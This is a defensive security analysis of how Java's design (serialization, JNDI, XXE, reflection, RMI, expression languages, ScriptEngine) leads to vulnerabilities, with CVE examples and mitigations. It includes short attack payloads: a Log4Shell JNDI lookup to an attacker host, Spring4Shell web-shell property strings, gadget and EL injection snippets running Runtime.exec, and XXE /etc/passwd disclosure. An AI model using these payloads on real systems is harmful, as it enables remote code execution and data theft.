# Java Language Security Analysis: Source Code and Implementation Meta-Patterns

> **Analysis Target**: Java Standard Library (OpenJDK) and Language Runtime
> **Source Investigation**: OpenJDK GitHub repository, Oracle JDK documentation, security specifications
> **Analysis Date**: 2026-02-08
> **CVE Coverage**: 2023-2025, including historical critical vulnerabilities
> **Methodology**: Direct source code analysis and meta-pattern extraction from language design decisions

---

## Executive Summary

This analysis identifies 16 fundamental meta-patterns where Java's language design decisions create systemic security vulnerabilities. Java's core philosophy—developer convenience, backward compatibility, cross-platform abstraction—systematically introduces risks across thousands of applications.

**Key Findings:**
- **Serialization as Trust**: Native serialization treats byte streams as trusted construction mechanisms, enabling arbitrary code execution
- **Parser Differential Vulnerabilities**: URL parsing inconsistencies between `java.net.URL` and browsers enable bypasses
- **Implicit Dynamic Invocation**: JNDI, reflection, and expression languages provide metaprogramming at the cost of injection vulnerabilities
- **Configuration Complexity Tax**: Secure XML parsing, deserialization filtering, and JNDI require too many knobs for correct implementation
- **Legacy Compatibility Burden**: Insecure defaults persist across decades due to backward compatibility

---

## Part 1: Core Language Design Meta-Patterns

### 1. Serialization as Implicit Constructor (CRITICAL)

Java serialization transparently persists object graphs without explicit logic, treating serialization as a language-level feature.

**Implementation Mechanism**:
```java
// java.io.ObjectInputStream (simplified)
private Object readObject0(boolean unshared) throws IOException {
    ObjectStreamClass desc = readClassDesc(false);
    // Instantiates object using class from UNTRUSTED stream
    Object obj = desc.isInstantiable() ? desc.newInstance() : null;
    // Calls readObject() AFTER instantiation
    if (obj != null && desc.hasReadObjectMethod()) {
        desc.invokeReadObject(obj, this);
    }
    return obj;
}
```

**Security Implications**:
- **Type Confusion**: The stream dictates which class to instantiate, not the application
- **Construction Before Validation**: Objects exist in memory before any security checks
- **Magic Method Invocation**: `readObject()`, `readResolve()`, `finalize()` execute automatically

**Attack Vector — Gadget Chain Construction**:
```java
// Apache Commons Collections InvokerTransformer gadget
InvokerTransformer transformer = new InvokerTransformer(
    "exec", new Class[]{String.class}, new Object[]{"calc.exe"}
);
// When chained with other transformers, achieves RCE
```

**Real-World Impact**:
- **CVE-2015-4852**: Oracle WebLogic Server RCE via deserialization ([Tenable](https://www.tenable.com/plugins/nessus/125265))
- **CVE-2023-4528**: JSCAPE MFT deserialization ([Rapid7](https://www.rapid7.com/blog/post/2023/09/07/cve-2023-4528-java-deserialization-vulnerability-in-jscape-mft-fixed/))
- **CVE-2024-22320**: IBM ODM deserialization RCE ([Vicarius](https://www.vicarius.io/vsociety/posts/unveiling-cve-2024-22320-a-novices-journey-to-exploiting-java-deserialization-rce-in-ibm-odm))

**Root Cause**: The specification acknowledges `readObject` is "effectively a public constructor" that must assume adversarial byte streams, yet the design makes secure implementation nearly impossible—developers must manually override `readObject()` in every serializable class, and no built-in allowlist existed until JEP 290 (Java 9, 2017).

**Design Context**: Serialization was designed in 1997 for trusted RMI communication between JVMs, prioritizing "magical" persistence without manual marshaling.

**Mitigation Evolution**:

| Java Version | Mitigation | Effectiveness |
|---|---|---|
| Java 1.1-8 | Manual `readObject()` validation | Rarely implemented correctly |
| Java 9 (2017) | JEP 290: Deserialization Filtering | Requires explicit configuration |
| Java 17+ | Strong warnings, serialization filter API | Still opt-in |

```java
// Modern approach: serialization filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("java.base/*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
```

**Fundamental Problem**: The design inverts the trust model—serialized data chooses classes, and the application must defensively validate.

---

### 2. URL Parsing Confusion (Parser Differential)

Java's `java.net.URL` attempts RFC-standard URL parsing while maintaining cross-protocol compatibility, creating parser differentials.

**Security Implications** — Different parsers interpret the same URL differently:
- **User Info**: `http://expected.com@attacker.com`
- **Backslash**: `http://example.com\attacker.com`
- **URL Encoding**: `http://example.com%2F@attacker.com`

**Attack Vector — SSRF via Validation Bypass**:
```java
// Vulnerable: different parsers for validation and usage
URI uri = new URI(userInput);    // Validation parser
if (isAllowed(uri.getHost())) {
    URL url = new URL(userInput); // Different parser!
    url.openConnection();         // Potential bypass
}

// Secure: use same parser consistently
URL url = new URL(userInput);
if (isAllowed(url.getHost())) {
    url.openConnection();
}
```

**Real-World Impact**:
- **CVE-2021-45046**: Log4Shell bypass via URL parsing confusion ([Claroty](https://claroty.com/team82/research/exploiting-url-parsing-confusion))
- **CVE-2024-22243/22259/22262**: Spring Framework URL parsing bypasses ([Spring Security](https://spring.io/security))

**Five Categories of Inconsistencies** ([Telefonica Tech](https://media.telefonicatech.com/telefonicatech/uploads/2021/1/149144_Exploiting-URL-Parsing-Confusion.pdf)):
Scheme confusion, slash confusion, backslash confusion, URL encoding confusion, scheme mixup.

**Design Context**: RFC 3986 allows multiple valid interpretations; `java.net.URL` and `java.net.URI` parse differently (URI is stricter RFC 3986; URL uses protocol-aware URLStreamHandler). Applications mixing these create bypasses.

---

### 3. JNDI Injection: Dynamic Class Loading by Design

JNDI provides unified access to naming/directory services (LDAP, DNS, RMI, CORBA), enabling dynamic service discovery—and remote code loading.

**Attack Vector — Log4Shell (CVE-2021-44228)**:
```java
// Log4j message lookup expands JNDI
String message = "${jndi:ldap://attacker.com/Exploit}";
logger.info(message);
// → InitialContext.lookup("ldap://attacker.com/Exploit") → RCE
```

**Exploit Flow**: Attacker injects `${jndi:ldap://...}` into logged data → Log4j performs JNDI lookup → Attacker's LDAP server returns reference to malicious class → Java downloads and executes it.

**Real-World Impact**:
- **CVE-2021-44228 (Log4Shell)**: Critical RCE affecting millions of applications ([Mandiant](https://cloud.google.com/blog/topics/threat-intelligence/log4shell-recommendations))
- **12% of Java applications** still vulnerable as of 2024 ([Qwiet AI](https://qwiet.ai/log4shell-jndi-injection-via-attackable-log4j/))

**Design Context**: JNDI reflects 1990s distributed computing assumptions—trusted networks, dynamic service discovery, transparent remoting for Enterprise Java Beans.

**Mitigation Evolution**:

| Java Version | Mitigation | Effectiveness |
|---|---|---|
| Java 6u45-8u121 | `com.sun.jndi.rmi.object.trustURLCodebase=false` | Requires explicit config |
| Java 8u191+ | RMI remote class loading disabled | Doesn't affect LDAP |
| Log4j 2.15.0 | JNDI disabled by default | Application-level fix |

```java
// Secure: only allow local JNDI lookups
if (jndiUrl.startsWith("java:comp/env/")) {
    ctx.lookup(jndiUrl);
}
```

---

### 4. XML External Entity (XXE): Default Insecurity

Java's XML parsers (DOM, SAX, StAX) default to feature-complete XML processing, including external entity resolution.

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
Document doc = factory.newDocumentBuilder().parse(untrustedXML); // VULNERABLE!
```

**Attack Vectors**: File disclosure (`SYSTEM "file:///etc/passwd"`), SSRF (`SYSTEM "http://internal/admin"`), Billion Laughs DoS (exponential entity expansion).

**Real-World Impact**:
- **CVE-2024-55887**: Ucum-java XXE ([Miggo](https://www.miggo.io/vulnerability-database/cve/CVE-2024-55887))
- **CVE-2024-52007**: HAPI FHIR XXE ([Snyk](https://security.snyk.io/vuln/SNYK-JAVA-CAUHNHAPIFHIR-8366323))

**Secure Configuration** (must configure 5+ features across 4 parser APIs):
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

**Design Context**: XML 1.0 spec (1998) includes external entities as core feature; Java aimed for full compliance. Changing defaults breaks existing applications.

**Complexity Tax**: Developers must know and configure different features for `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, and `TransformerFactory` to achieve security.

---

### 5. Reflection: Security Through Obscurity

Java reflection provides runtime introspection and invocation, bypassing compile-time type checking and access control.

```java
Class<?> clazz = Class.forName(className);
Method method = clazz.getMethod(methodName, paramTypes);
method.invoke(instance, args); // Arbitrary method invocation
```

**Security Implications**: `setAccessible(true)` breaks encapsulation; `Class.forName()` accepts any string; any method invocable with arbitrary arguments.

**Attack Vectors**:
- **Deserialization Gadgets**: `InvokerTransformer` uses reflection for arbitrary method invocation
- **Expression Language Injection**: `Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context)`
- **Sandbox Escape**: Access `sun.misc.Unsafe` via `setAccessible(true)` for direct memory manipulation

**Real-World Impact**:
- **CVE-2013-0422**: Applet sandbox escape via reflection ([Threatpost](https://threatpost.com/old-attack-exploits-new-java-reflection-api-flaw/101388/))
- **Bean Stalking**: Java beans → RCE via reflection ([GitHub Security Lab](https://github.blog/security/vulnerability-research/bean-stalking-growing-java-beans-into-remote-code-execution/))

**Mitigation**: Class whitelisting, Module System restrictions (Java 9+: don't export internal packages), avoid reflection on untrusted input.

**Design Context**: Frameworks (DI, ORM, testing) require reflection; JVM languages (Groovy, Scala) depend on it. Power equivalent to `eval()` but with static language assumptions.

---

### 6. RMI Registry: Implicit Trust in Network Services

RMI enables distributed object communication with transparent remote method calls, combining multiple attack surfaces.

**Attack Surfaces**: Deserialization (parameter marshaling), DGC exploitation (accepts arbitrary serialized objects), registry manipulation (no default authentication).

| Component | Port | Attack Vector | Mitigation |
|---|---|---|---|
| RMI Registry | 1099 | Bind malicious objects | Network isolation |
| RMI-IIOP | 1050 | CORBA/RMI hybrid attacks | Disable IIOP |
| DGC | Same as object | Deserialization on any RMI call | JEP 290 filters |
| JMX over RMI | varies | Management interface exploitation | Authentication |

**Real-World Impact**:
- **Oracle WebLogic RMI Vulnerabilities**: Multiple CVEs ([Rapid7](https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server/))
- **Post-JEP 290 Attacks**: Exploitation still possible after filters ([MOGWAI Labs](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/))

**Reconnaissance**: RMIScout ([Bishop Fox](https://bishopfox.com/blog/rmiscout)), remote-method-guesser ([GitHub](https://github.com/qtc-de/remote-method-guesser))

**Design Context**: 1997 intranet design — transparent distribution, trusted network, automatic marshaling. Use authenticated RMI with SSL in production.

---

## Part 2: API Design and Default Configuration Patterns

### 7. ClassLoader Manipulation: Trust Boundary Confusion

Java's ClassLoader hierarchy enables flexible class loading with parent-delegation model, but manipulation enables class impersonation and privilege escalation.

**Attack Vector — Spring4Shell (CVE-2022-22965)**:
```java
// Attacker manipulates JavaBeans property binding to access Tomcat's ClassLoader
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{...}
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
// Results in writing malicious JSP web shell
```

**Real-World Impact**:
- **CVE-2022-22965 (Spring4Shell)**: ClassLoader manipulation for RCE ([Contrast Security](https://www.contrastsecurity.com/security-influencers/qa-how-does-the-new-contrast-protect-classloader-manipulation-rule-block-spring4shell-and-future-exploits))
- **CVE-2014-0114**: Apache Struts ClassLoader manipulation ([IBM](https://www.ibm.com/support/pages/security-bulletin-classloader-manipulation-vulnerability-ibm-websphere-application-server-cve-2014-0114))
- **Java Class Hijacking**: Supply chain attacks via Maven dependency resolution ([arXiv](https://arxiv.org/html/2407.18760v2))

**Defense**: Use specific trusted ClassLoader (`Class.forName(name, true, trustedCL)`), verify both class name AND ClassLoader identity, use Module System (Java 9+) and Sealed Classes (Java 15+) for stronger isolation.

---

### 8. Expression Language Injection: Metaprogramming as Feature

Expression Languages (SpEL, OGNL, JEXL, MVEL) provide dynamic evaluation with full JVM access.

**Attack Vectors**:
```java
// SpEL: T(java.lang.Runtime).getRuntime().exec('calc')
// OGNL (Struts 2 CVE-2017-5638): Content-Type header injection
// JEXL: sandbox bypass via alternative access patterns
```

**Why Dangerous**: Not a subset of Java—can do anything Java can do, with built-in reflection capabilities and no default sandboxing.

**Real-World Impact**: Dozens of Struts 2 OGNL injection CVEs; Spring SpEL injection RCE; MVEL exploitation in Red Hat projects.

**Mitigation**: Avoid user input in expressions (best); use pre-defined expression maps; sandboxing is complex and bypasses are common.

---

### 9. ScriptEngine: JavaScript Sandbox Escape

Java's ScriptEngine API (JSR 223) embeds scripting languages, but sandboxing is insufficient—scripts can access Java classes by default.

```javascript
// Nashorn: direct Java class access
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('calc.exe'); // RCE
```

**Real-World Impact**:
- **CVE-2025-30761**: Nashorn arbitrary code execution ([OSS Security](https://www.openwall.com/lists/oss-security/2025/07/16/1))
- ClassFilter bypass research ([Matthias Bechler](https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/))

**Nashorn Timeline**: Included (Java 8-10) → Deprecated (Java 11-14) → Removed (Java 15+)

**Secure Alternative — GraalVM**:
```java
Context context = Context.newBuilder("js")
    .allowHostAccess(HostAccess.NONE)
    .allowHostClassLookup(s -> false)
    .allowIO(IOAccess.NONE)
    .build();
context.eval("js", userScript); // Sandboxed
```

---

### 10. SecurityManager Deprecation: Removing Defense in Depth

SecurityManager (Java 1.0, 1996) provided fine-grained access control. **JEP 411 (Java 17)** deprecated it; **JEP 486 (Java 24)** permanently disabled it.

**Impacts**: No fine-grained access control for libraries; no in-process sandboxing for plugins; no `System.exit()` prevention.

**Real-World Impact**:
- Apache NetBeans: uses SM to prevent `System.exit()` ([NetBeans](https://netbeans.apache.org/front/main/blogs/entry/jep-411-deprecate-the-security/))
- OpenSearch: must find alternatives for plugin restriction ([GitHub](https://github.com/opensearch-project/OpenSearch/issues/1687))

| Use Case | SM Approach | Replacement |
|---|---|---|
| Sandbox untrusted code | Policy files | Containers, VMs |
| Prevent System.exit() | checkExit() | Architectural patterns |
| Monitor file access | Custom SM | JVM agent, AOP |
| Restrict network | SocketPermission | OS-level firewall |

**Fundamental Shift**: Java moves from in-process sandboxing to process-level isolation (containers, VMs).

---

## Part 3: Low-Level Security Mechanisms

### 11. Unsafe Memory Access: Direct Memory Manipulation

`sun.misc.Unsafe` provides direct memory access, CAS operations, and JVM intrinsics that bypass Java's safety guarantees: arbitrary memory read/write, type safety bypass, no bounds checking, JVM crashes without exceptions.

**Real-World Impact**: CVE-2023-6378 (Logback Unsafe issues); C-style buffer overflows in Java.

**Deprecation and Replacement**:

| Unsafe Operation | Replacement | Java Version |
|---|---|---|
| Direct memory access | `MemorySegment` (Foreign Memory API) | Java 22+ |
| Volatile field access | `VarHandle` | Java 9+ |
| CAS operations | `VarHandle` compareAndSet | Java 9+ |
| Object allocation | `MethodHandles.Lookup` | Java 15+ |

**Timeline**: Java 9 (VarHandle) → Java 22 (MemorySegment finalized) → JEP 471/498 (Java 23-24: Unsafe deprecated with warnings).

---

### 12. Bytecode Verification Bypass: Low-Level Security Failure

The bytecode verifier ensures class files conform to type safety rules. Bugs or disabled verification enable all attacks Java is designed to prevent.

**Real-World Impact**:
- **2012-2013**: 20+ verifier vulnerabilities found by Security Explorations ([BlackHat](https://www.blackhat.com/presentations/bh-asia-02/LSD/bh-asia-02-lsd.pdf))
- **Java Card**: Verifier bugs in 5 implementations ([Springer](https://link.springer.com/chapter/10.1007/978-3-642-38613-8_16))
- **CVE-2013-0422/CVE-2012-4681**: Type confusion and sandbox escape

**Modern Status**: Java 13+ removed `-Xverify:none`; Java 15+ uses only the new verifier. Verification logic continues receiving security updates.

---

## Part 4: Cross-Cutting Security Meta-Patterns

### 13. Backward Compatibility Tax: Security vs. Legacy

Java maintains binary/behavioral compatibility across versions, forcing insecure defaults to persist decades after being recognized.

| Feature | Introduced | Recognized Dangerous | Secure Default | Years Insecure |
|---|---|---|---|---|
| Serialization | 1997 | ~2008 | Never (opt-in filters) | 27+ |
| XXE | 1998 | ~2002 | Never (explicit config) | 26+ |
| JNDI Remote Loading | 2000 | ~2016 | Java 8u191 (2018) | 18 |
| SecurityManager | 1996 | ~2010 | Removed 2024 | N/A |

**Root Cause**: "Write Once, Run Anywhere" extends to "Written Decades Ago, Still Runs Today"—including decades-old insecure defaults.

---

### 14. Configuration Complexity: Security Through Expertise

Achieving security requires extensive configuration knowledge most developers lack. Secure XML parsing needs 5+ features; JNDI security needs 3+ system properties; deserialization filtering needs complex filter syntax; RMI security needs separate properties. See individual meta-patterns (4, 3, 1, 6) for specific configurations.

**Fundamental Problem**: Security should be the default, requiring opt-in for insecure features. Java often inverts this.

---

### 15. Implicit Trust Boundaries: Confused Deputies

Java APIs implicitly trust inputs without documenting trust boundaries:

| API | Implicit Trust | Reality | Consequence |
|---|---|---|---|
| ObjectInputStream | Stream controls instantiation | Stream may be attacker-controlled | Deserialization RCE |
| JNDI.lookup() | URL points to safe service | URL may be attacker-controlled | Remote code loading |
| Class.forName() | Class name is safe | May come from user input | Malicious class loading |
| ScriptEngine.eval() | Script is safe | May contain user input | Code injection |

APIs don't distinguish trusted from untrusted data types, leaving trust decisions entirely to developers.

---

### 16. Dynamic Features as Attack Primitives

Java's dynamic features serve dual purposes—each is both a developer tool and an attacker tool:

| Feature | Legitimate Use | Attack Primitive |
|---|---|---|
| Reflection | DI, ORM, testing | Arbitrary method invocation |
| Serialization | Persistence, RPC | Arbitrary object instantiation |
| JNDI | Service discovery | Remote class loading |
| Expression Languages | Configuration, rules | Code injection |
| ScriptEngine | Scripting, extensions | Sandbox escape |
| ClassLoader | Plugin systems | Class impersonation |

**Serialization as Universal Protocol**: Serialization is used not just for persistence but as wire protocol (RMI, JMX, JMS, sessions, caches), meaning a single deserialization vulnerability affects network protocols, caches, sessions, and management interfaces.

**Reflection as Universal Gadget**: Reflection enables chaining gadget classes (e.g., `InvokerTransformer` → `LazyMap` → `AnnotationInvocationHandler`) for exploitation. Every Java application has reflection capabilities, and standard libraries provide ready-made gadgets.

**Fundamental Trade-off**: Static languages (C, Go) have fewer dynamic features but less framework magic. Java chose dynamic features for productivity, accepting security risks.

---

## Appendix A: Attack-Pattern-Defense Mapping

| Meta-Pattern | Representative Attack | CVE Example | Mitigation |
|---|---|---|---|
| Serialization as Constructor | Gadget chain RCE | CVE-2015-4852, CVE-2024-22320 | JEP 290 filters, avoid native serialization |
| URL Parsing Confusion | SSRF bypass | CVE-2024-22243, CVE-2021-45046 | Use single parser consistently |
| JNDI Injection | Log4Shell RCE | CVE-2021-44228 | Disable remote loading, validate URLs |
| XXE | File disclosure, SSRF | CVE-2024-55887 | Disable external entities |
| Reflection Abuse | Deserialization gadgets | Multiple | Class whitelisting, module system |
| RMI Exploitation | DGC deserialization | WebLogic CVEs | Network isolation, JEP 290 |
| ClassLoader Manipulation | Spring4Shell | CVE-2022-22965 | Validate ClassLoader source |
| EL Injection | Struts 2 RCE | CVE-2017-5638 | Avoid user input in expressions |
| ScriptEngine Injection | Nashorn escape | CVE-2025-30761 | GraalVM with strict sandboxing |
| SM Deprecation | Loss of sandboxing | JEP 411/486 | Container-based isolation |
| Unsafe Memory | Memory corruption | Various | VarHandle/MemorySegment |
| Bytecode Verifier Bypass | Type confusion | CVE-2013-0422 | Never disable verification |
| Backward Compat Tax | Decades of insecure defaults | Systemic | Explicit secure configuration |
| Config Complexity | Incorrect secure config | Systemic | Framework-level secure defaults |
| Implicit Trust | Confused deputy | Multiple | Explicit trust validation |
| Dynamic Features | All injection attacks | All above | Minimize dynamic code execution |

---

## References

### Primary Sources
- [OpenJDK GitHub Repository](https://github.com/openjdk/jdk)
- [Java Language Specification](https://docs.oracle.com/javase/specs/jls/se21/html/index.html)
- [Java Security Documentation](https://docs.oracle.com/javase/10/security/java-security-overview1.htm)
- [Java Serialization Specification - Security](https://docs.oracle.com/javase/6/docs/platform/serialization/spec/security.html)
- [Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html)

### CVE and Vulnerability Research
- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [Exploiting URL Parsing Confusion - Claroty Team82](https://claroty.com/team82/research/exploiting-url-parsing-confusion)
- [Log4Shell JNDI Injection - ExtraHop](https://www.extrahop.com/resources/detections/log4shell-jndi-injection-attempt)
- [Spring Framework Security Advisories](https://spring.io/security)

### Academic Research
- [In-depth Study of Java Deserialization RCE - ACM](https://dl.acm.org/doi/abs/10.1145/3554732)
- [Exploiting Deserialization in Recent Java Versions - OWASP Stuttgart](https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf)
- [BlackHat: Twenty Years of Escaping the Java Sandbox](https://www.exploit-db.com/papers/45517)

### JDK Enhancement Proposals (JEPs)
- [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290)
- [JEP 411: Deprecate the Security Manager for Removal](https://openjdk.org/jeps/411)
- [JEP 486: Permanently Disable the Security Manager](https://openjdk.org/jeps/486)
- [JEP 471: Deprecate the Memory-Access Methods in sun.misc.Unsafe](https://openjdk.org/jeps/471)

### Security Standards
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [SEI CERT Oracle Coding Standard for Java](https://wiki.sei.cmu.edu/confluence/display/java)
